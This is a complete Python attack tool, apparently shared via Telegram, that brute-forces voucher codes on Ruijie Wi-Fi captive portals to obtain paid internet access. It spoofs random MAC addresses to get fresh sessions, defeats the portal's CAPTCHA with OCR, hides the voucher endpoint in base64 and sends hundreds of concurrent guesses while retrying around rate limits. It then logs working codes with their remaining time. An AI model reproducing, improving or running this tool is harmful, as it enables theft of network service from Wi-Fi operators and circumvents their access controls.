#!/usr/bin/env python3
# thomas.py - Ruijie Voucher Scanner (Password Protected)
# Version: 6.0 - Thomas Edition
# Password: mgthomas2009

import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import socket
import sys
import cv2
import ddddocr
import numpy as np
import urllib3
import requests

# ─────────────────────────── Settings ───────────────────────────
CONCURRENCY  = 300
BATCH_SIZE   = 300
RESULT_FILE  = os.path.expanduser("~/scan_results.txt")
# ────────────────────────────────────────────────────────────────

_connector      = None
_voucher_sem    = None
_ocr            = ddddocr.DdddOcr(show_ad=False)
stop_flag       = False
found_codes     = []
limited_codes   = []
retry_total     = 0
scan_start_time = None
portal_url      = None
mode            = "6"
speed           = 300
current_code    = "000000"
hits            = 0
expired         = 0
limits          = 0
checked_total   = 0
found_list      = []
display_counter = 0

# ANSI colors
COLOR_RESET = "\033[0m"
BOLD        = "\033[1m"
DIM         = "\033[2m"
GREEN       = "\033[92m"
YELLOW      = "\033[93m"
RED         = "\033[91m"
BLUE        = "\033[94m"
CYAN        = "\033[96m"
MAGENTA     = "\033[95m"
WHITE       = "\033[97m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────── PASSWORD CHECK ──────────────────────
EXPECTED_PASSWORD = "mgthomas2009"   # <-- ဒီမှာ ပြောင်းလို့ရတယ်

def check_password():
    print(f"\n{BOLD}{BLUE}[!] This tool is password protected.{COLOR_RESET}")
    print(f"{YELLOW}[*] Enter password to continue:{COLOR_RESET}")
    user_input = input("➜ ").strip()
    if user_input == EXPECTED_PASSWORD:
        print(f"\n{GREEN}[✓] Access Granted!{COLOR_RESET}")
        return True
    else:
        print(f"\n{RED}[✗] Access Denied! Invalid password.{COLOR_RESET}")
        return False

# ═══════════════════════════ LOGO ════════════════════════════════

def show_logo():
    logo = f"""
{BOLD}{BLUE}═══════════════════════════════════════════════════════{COLOR_RESET}
{BOLD}{GREEN}  RUIJIE ASYNC EXTREME - THOMAS EDITION  {COLOR_RESET}
{BOLD}{BLUE}  Telegram @Thomas_Shelby2218{COLOR_RESET}
{BOLD}{BLUE}═══════════════════════════════════════════════════════{COLOR_RESET}
"""
    print(logo)

# ═══════════════════════════ PORTAL CATCHER ════════════════════

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def fetch_portal():
    print(f"\n{BLUE}[*] Finding portal...{COLOR_RESET}")

    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]
    gateways = list(dict.fromkeys(gateways))

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept': '*/*'
    }

    portal_url = None

    for gw in gateways:
        target = f"http://{gw}"
        print(f"{CYAN}[*] Trying: {target}...{COLOR_RESET}")
        try:
            res = requests.get(target, headers=headers, timeout=3, allow_redirects=True)

            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url
                break

            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                portal_url = extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
                break

        except requests.exceptions.RequestException:
            pass

    if portal_url:
        api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
        api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        print(f"\n{GREEN}[+] Portal URL captured!{COLOR_RESET}")
        return api_url
    else:
        print(f"\n{RED}[-] Failed to capture portal URL{COLOR_RESET}")
        return None

# ═══════════════════════════ MENU ══════════════════════════════

def show_menu():
    print(f"\n{BOLD}{BLUE}---{COLOR_RESET}")
    print(f"{BOLD}{GREEN}Thomas Voucher Scanner{COLOR_RESET}")
    print(f"{BOLD}{BLUE}---{COLOR_RESET}")
    print(f"  {YELLOW}1.{COLOR_RESET} Auto-Catch Portal URL")
    print(f"  {YELLOW}2.{COLOR_RESET} Manual Enter Portal URL")
    print(f"  {YELLOW}3.{COLOR_RESET} Change Mode (current: {mode})")
    print(f"  {YELLOW}4.{COLOR_RESET} Start Scanner")
    print(f"  {YELLOW}5.{COLOR_RESET} Recheck (from file)")
    print(f"  {YELLOW}6.{COLOR_RESET} View Hits")
    print(f"  {YELLOW}7.{COLOR_RESET} Exit")
    print(f"{BLUE}---{COLOR_RESET}")

# ═══════════════════════════ CODE GENERATORS ════════════════════

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

_alnum = string.ascii_lowercase + string.digits
_alpha = string.ascii_lowercase

def all_generator(length=6):
    return "".join(random.choice(_alnum) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(_alpha) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    while True:
        if mode == "8":
            yield digit_generator(8)
        elif mode == "ascii-lower":
            yield ascii_generator(6)
        elif mode == "all":
            yield all_generator(6)
        else:
            raise ValueError(f"Unknown mode: {mode}")

# ═══════════════════════════ NETWORK HELPERS ════════════════════

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0,255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

# ═══════════════════════════ CAPTCHA ════════════════════════════

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur  = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return _ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

# ═══════════════════════════ BALANCE INFO ═══════════════════════

async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]

    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')

                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"

                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue

    return "Plan:Unknown | Time:Unknown"

# ═══════════════════════════ SAVE RESULT ════════════════════════

def save_result(code, info, kind="SUCCESS"):
    with open(RESULT_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{kind}] {code}  |  {info}\n")

# ═══════════════════════════ VOUCHER CHECK ══════════════════════

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total, current_code, hits, expired, limits, found_list

    current_code = code

    for attempt in range(2):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=20)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                expired += 1
                return

            auth_code = None
            for _ in range(3):
                try:
                    img      = await Captcha_Image(sess, session_id)
                    text     = await Captcha_Text(img)
                    if not text:
                        continue
                    verified = await Varify_Captcha(sess, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except:
                    pass

            if not auth_code or stop_flag:
                expired += 1
                return

            payload = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
                "authCode":   auth_code,
            }
            headers = {
                "authority":       "portal-as.ruijienetworks.com",
                "accept":          "*/*",
                "content-type":    "application/json",
                "origin":          "https://portal-as.ruijienetworks.com",
                "user-agent":      "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                                   "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                expired += 1
                return

        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.3)
            continue
        break
    else:
        expired += 1
        return

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        found_list.append(f"{GREEN}✅ {code} | {info}{COLOR_RESET}")
        hits += 1
        save_result(code, info, "HIT")

    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        found_list.append(f"{YELLOW}⚠️ {code} | {info}{COLOR_RESET}")
        limits += 1
        save_result(code, info, "LIMIT")
    else:
        expired += 1

# ═══════════════════════════ RUNNER ═════════════════════════════

async def run_bruteforce(mode, session_url, speed):
    global _voucher_sem, stop_flag, scan_start_time, _connector, CONCURRENCY, BATCH_SIZE
    global hits, expired, limits, current_code, checked_total, found_list, display_counter

    CONCURRENCY = speed
    BATCH_SIZE = speed

    hits = 0
    expired = 0
    limits = 0
    checked_total = 0
    current_code = "000000"
    found_list = []
    found_codes.clear()
    limited_codes.clear()
    retry_total = 0
    display_counter = 0

    _connector      = aiohttp.TCPConnector(limit=CONCURRENCY + 100, ssl=False)
    _voucher_sem    = asyncio.Semaphore(CONCURRENCY)
    stop_flag       = False
    scan_start_time = time.monotonic()

    code_iter = iter_codes(mode)
    total     = 10 ** int(mode) if mode in ["6", "7"] else None
    checked_total = 0

    show_logo()

    print(f"\n{BOLD}{BLUE}--- Configure Workers ---{COLOR_RESET}")
    print(f"{YELLOW}Enter number of workers for scanner (default {speed}): {COLOR_RESET}", end="")
    worker_input = input().strip()
    if worker_input.isdigit():
        speed = int(worker_input)
        CONCURRENCY = speed
        BATCH_SIZE = speed
    print(f"{GREEN}Scanner workers set to {CONCURRENCY}{COLOR_RESET}")

    try:
        while not stop_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked_total += len(batch)

            elapsed = time.monotonic() - scan_start_time
            speed_display = (checked_total / elapsed * 60) if elapsed > 0 else 0

            display_counter += 1

            if display_counter % 1 == 0:
                print("\033c", end="")
                show_logo()

                thomas_art = f"""
{BOLD}{BLUE}╔═══════════════════════════════════════════════════════════════╗{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BOLD}{MAGENTA} ████████╗██╗  ██╗ ██████╗ ███╗   ███╗ █████╗ ███████╗{COLOR_RESET}  {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BOLD}{MAGENTA} ╚══██╔══╝██║  ██║██╔═══██╗████╗ ████║██╔══██╗██╔════╝{COLOR_RESET}  {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BOLD}{MAGENTA}    ██║   ███████║██║   ██║██╔████╔██║███████║███████╗{COLOR_RESET}  {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BOLD}{MAGENTA}    ██║   ██╔══██║██║   ██║██║╚██╔╝██║██╔══██║╚════██║{COLOR_RESET}  {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BOLD}{MAGENTA}    ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║███████║{COLOR_RESET}  {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BOLD}{MAGENTA}    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝{COLOR_RESET}  {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}╠═══════════════════════════════════════════════════════════════╣{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {CYAN}▣ TRIED: {checked_total:,}{COLOR_RESET}                                      {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {YELLOW}◈ CURRENT CODE: {current_code}{COLOR_RESET}                             {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BLUE}⚡ SPEED: {speed_display:.1f} c/s{COLOR_RESET}                                    {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {DIM}▶ PRESS ENTER TO RETURN{COLOR_RESET}                             {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}╠═══════════════════════════════════════════════════════════════╣{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {GREEN}● HITS    : {hits}{COLOR_RESET}                                       {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {RED}● EXPIRED : {expired}{COLOR_RESET}                                       {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {YELLOW}● LIMITS  : {limits}{COLOR_RESET}                                       {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}╚═══════════════════════════════════════════════════════════════╝{COLOR_RESET}"""

                found_display = ""
                if found_list:
                    recent = found_list[-5:] if len(found_list) > 5 else found_list
                    found_display = "\n" + "\n".join(recent)

                print(thomas_art + found_display, flush=True)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        if _connector:
            await _connector.close()

    elapsed = time.monotonic() - scan_start_time
    hh, rem = divmod(int(elapsed), 3600)
    mm, ss  = divmod(rem, 60)

    print(f"\n\n{BOLD}{GREEN}{'='*55}{COLOR_RESET}")
    print(f"  {BOLD}{GREEN}Scan Complete{COLOR_RESET}")
    print(f"{BOLD}{GREEN}{'='*55}{COLOR_RESET}")
    print(f"  {BLUE}Time{COLOR_RESET}         : {BOLD}{hh}h {mm}m {ss}s{COLOR_RESET}")
    print(f"  {BLUE}Checked{COLOR_RESET}      : {BOLD}{checked_total:,}{COLOR_RESET}")
    print(f"  {BLUE}Hits{COLOR_RESET}         : {BOLD}{GREEN}{hits}{COLOR_RESET}")
    print(f"  {BLUE}Limits{COLOR_RESET}       : {BOLD}{YELLOW}{limits}{COLOR_RESET}")
    print(f"  {BLUE}Expired{COLOR_RESET}      : {BOLD}{RED}{expired}{COLOR_RESET}")
    print(f"  {BLUE}Retries{COLOR_RESET}      : {BOLD}{RED}{retry_total}{COLOR_RESET}")
    print(f"  {BLUE}Results{COLOR_RESET}      : {BOLD}{RESULT_FILE}{COLOR_RESET}")
    print(f"{BOLD}{GREEN}{'='*55}{COLOR_RESET}")

    if found_codes:
        print(f"\n{GREEN}✅ ALL FOUND CODES:{COLOR_RESET}")
        for c in found_codes:
            print(f"   {c}")

    print(f"\n{BLUE}───────────────────────────────────────────{COLOR_RESET}")
    input(f"{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

# ═══════════════════════════ VIEW RESULTS ═══════════════════════

def view_results():
    if os.path.exists(RESULT_FILE):
        print(f"\n{BOLD}{CYAN}Results from {RESULT_FILE}:{COLOR_RESET}\n")
        with open(RESULT_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if content.strip():
                print(content)
            else:
                print(f"{YELLOW}[!] File is empty.{COLOR_RESET}")
    else:
        print(f"\n{YELLOW}[!] No results file found at {RESULT_FILE}{COLOR_RESET}")

# ═══════════════════════════ MAIN ASYNC LOOP ════════════════════════

async def async_main():
    global portal_url, mode, CONCURRENCY, BATCH_SIZE

    # ─── Password Check ───
    if not check_password():
        sys.exit(1)
    # ───────────────────────

    os.system('clear' if os.name == 'posix' else 'cls')
    show_logo()

    while True:
        show_menu()
        choice = input(f"\n{BOLD}{GREEN}Enter your choice:{COLOR_RESET} ").strip()

        if choice == "1":
            portal_url = fetch_portal()
            if portal_url:
                print(f"{GREEN}[✓] URL: {portal_url}{COLOR_RESET}")
            input(f"\n{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

        elif choice == "2":
            print(f"\n{YELLOW}[*] Enter Portal URL manually:{COLOR_RESET}")
            portal_url = input("➜ ").strip()
            if portal_url:
                print(f"{GREEN}[✓] URL set!{COLOR_RESET}")
            input(f"\n{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

        elif choice == "3":
            print(f"\n{YELLOW}[*] Enter mode (6, 7, 8, ascii-lower, all):{COLOR_RESET}")
            new_mode = input("➜ ").strip()
            if new_mode in ["6", "7", "8", "ascii-lower", "all"]:
                mode = new_mode
                print(f"{GREEN}[✓] Mode changed to: {mode}{COLOR_RESET}")
            else:
                print(f"{RED}[✗] Invalid mode!{COLOR_RESET}")
            input(f"\n{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

        elif choice == "4":
            if not portal_url:
                print(f"{RED}[✗] Please set Portal URL first (Option 1 or 2).{COLOR_RESET}")
                input(f"\n{CYAN}[*] Press Enter to continue...{COLOR_RESET}")
                continue
            await run_bruteforce(mode, portal_url, CONCURRENCY)

        elif choice == "5":
            print(f"\n{YELLOW}[*] Recheck feature: Re-scan saved codes? (Not fully implemented){COLOR_RESET}")
            input(f"\n{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

        elif choice == "6":
            view_results()
            input(f"\n{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

        elif choice == "7":
            print(f"\n{YELLOW}[*] Exiting...{COLOR_RESET}")
            break

        else:
            print(f"{RED}[✗] Invalid choice!{COLOR_RESET}")
            time.sleep(1)

# ═══════════════════════════ ENTRY POINT ════════════════════════

if __name__ == "__main__":
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Interrupted by user.{COLOR_RESET}")
    except Exception as e:
        print(f"\n{RED}[✗] Fatal Error: {e}{COLOR_RESET}")
